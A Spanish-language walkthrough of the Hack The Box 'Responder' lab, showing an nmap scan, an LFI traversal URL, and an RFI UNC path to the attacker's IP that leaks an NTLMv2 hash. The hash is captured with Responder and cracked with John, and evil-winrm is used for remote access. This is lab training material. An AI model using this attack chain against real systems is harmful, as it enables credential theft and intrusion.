@@ -1,0 +1,175 @@
+## Iniciamos la vpn
+sudo openvpn starting_point_scr1pter98.ovpn
+##Conectados ya a la red de la máquina víctima..
+
+## WhichSystem
+
+[*] 10.129.28.241 (ttl -> 127): Windows
+
+## NMAP
+# Descubramos puertos y servicios en la máquina objetivo
+
+sudo nmap --open -sS -p- -sCV -n -Pn -T5 -v 10.129.1.15 -oG escaneoNmap
+
+## Encontramos algunas cosas
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+## 2 puertos abiertos fueron detectados como abierto con el servidor web Apache funcionando en el puerto 80 junto con WinRM en el puerto 5985
+
+# Puerto 80:  Apache httpd 2.4.52                      // Entonces ingresamos a http://10.129.28.241/ > Recordemos que si no puede resolver el nombre del host
+agregarlo con: sudo nano /etc/host
+
+# Puerto 5985 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  //
+
+Este es un servidor web HTTP ligero que forma parte de las APIs de Windows para manejar solicitudes HTTP.
+Es comúnmente utilizado por aplicaciones o servicios del sistema operativo que requieren capacidades básicas de servidor HTTP, como servicios de administración,
+diagnóstico o interfaces API expuestas localmente o en red.
+
+
+## Entonces manos a la obra. 
+#Vemos que funciona un path traversal en la URL por lo que conseguimos acceso a la información del equipo.
+
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+#Entonces nos ponemos en escucha con nc por el puerto 443 con:
+
+nc -lvnp 443
+
+#Introducimos 
+http://unika.htb/index.php?page=\\10.10.14.169\test\test // Para testear que tenemos conexión y eso ocurre.
+
+  pwn3r   ~  sudo nc -lvnp 445
+Deploying root access for pwn3r. Password pls:
+Connection from 10.129.28.241:57569
+ESMBrS�"NT LM 0.12SMB 2.002SMB 2.???
+
+## Entonces en esta posición, podemos utilizar la herramiente RESPONDER o IMPACKET: Cualquiera de las dos nos sería util.
+# En este caso veremos las 2, procuremos instalar las herramientas.
+
+## Empecemos con IMPACKET
+
+sudo impacket-smbserver -smb2support share ./   << nos ponemos a la escucha del lado de impacket y recargamos la web, en este caso tuve problemas con impacket
+Vamos a hacerlo con RESPONDER
+
+# RESPONDER
+
+Una vez instalado responder, nos ponemos a la escucha por la interfaz deseada.
+En este caso:
+
+sudo responder -I tun0 < tun0 es la interfaz de hack the box en este caso
+
+>> Refrescamos el navegador con nuestra prueba: http://unika.htb/index.php?page=//10.10.14.169\test\test
+Y boalá, capturamos un hash:
+
+[SMB] NTLMv2-SSP Client   : 10.129.28.241
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:87f315b8302efd1b:A7428822BCD0BF725FD38A8607172551:0101000000000000809C36231470DB0116D6CD5F4F1FD99700000000020008004E0051004A004E0001001E00570049004E002D005500300031004B0043004B00310051004E005A00440004003400570049004E002D005500300031004B0043004B00310051004E005A0044002E004E0051004A004E002E004C004F00430041004C00030014004E0051004A004E002E004C004F00430041004C00050014004E0051004A004E002E004C004F00430041004C0007000800809C36231470DB0106000400020000000800300030000000000000000100000000200000573EF38C127B2BB7B012C25B5362487D5E6B717842923E0EAD284C037872DC1D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100360039000000000000000000
+
+#Vamos a destriparlo
+
+Nos traemos a local este hash para destriparlo, primeramente en nuestro directorio de trabajo lo almacenamos como un .txt para con un diccionario romper ese hash. 
+Quizá sea buena idea comprobar que tipo de HASH es.
+
+## JHON THE RIPPER
+
+  pwn3r   ~/Desktop/HTB/Responder/content git-[ main]-  john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash00.txt
+
+[PwnerHost:56968] shmem: mmap: an error occurred while determining whether or not /tmp/ompi.PwnerHost.1000/jf.0/691535872/shared_mem_cuda_pool.PwnerHost could be created.
+[PwnerHost:56968] create_and_attach: unable to create shared memory BTL coordinating structure :: size 134217728
+Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
+Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+badminton        (Administrator) >>>>> PASSWORD 
+1g 0:00:00:00 DONE (2025-01-26 17:38) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+
+## Con jack encontramos que la contraseñá de administrator es 'badminton'
+
+## Probemos entonces con EVIL-WINRM adquirir ejecución remota de comandos o RCE.
+
+#Instalamos todo lo necesario para que funcione.
+
+  pwn3r   ~/Descargas/evil-winrm git-[ master]-  ruby evil-winrm.rb -i unika.htb -u Administrator -p badminton
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+responder\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ss
+The term 'ss' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ ss
++ ~~
+    + CategoryInfo          : ObjectNotFound: (ss:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+*Evil-WinRM* PS C:\Users\Administrator\Documents> netstat
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    10.129.238.241:5985    10.10.14.169:45956     TIME_WAIT
+  TCP    10.129.238.241:5985    10.10.14.169:45958     ESTABLISHED
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+## Logramos explotar un RCE
+# Ahora a lo que venimos... Indagamos un poco y obtenemos la bandera.
+
+*Evil-WinRM* PS C:\Users\mike\desktop> cat flag.txt
+ea81b7afddd03efaa0945333ed147fac
+
+*Evil-WinRM* PS C:\Users\mike\desktop> get-content flag.txt
+ea81b7afddd03efaa0945333ed147fac
+
+
+FLAG: ea81b7afddd03efaa0945333ed147fac
+
+En esta máquina vimos - WinRM 
+				      - Custom Applications
+				      - XAMPP
+				      - SMB
+				      - Responder 
+				      - PHP
+				      - Password Cracking
+				      - Hash Capture
+				      - Remote File Inclusion
+				      - Remote Code Execution
+
+
+
+## LFI vs RFI
+
+## Logramos explotar un LFI con:
+
+# http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+Esto nos permitió conseguir informaciòn sensible del equipo.
+
+## Logramos explotar un RFI con:
+
+# 10.10.14.169/somefile
+
+Incluyendo así archivos locales nuestros de manera remota hacia el servidor.
+
+
+## Hasheamos contraseñas con John the Ripper
+# 
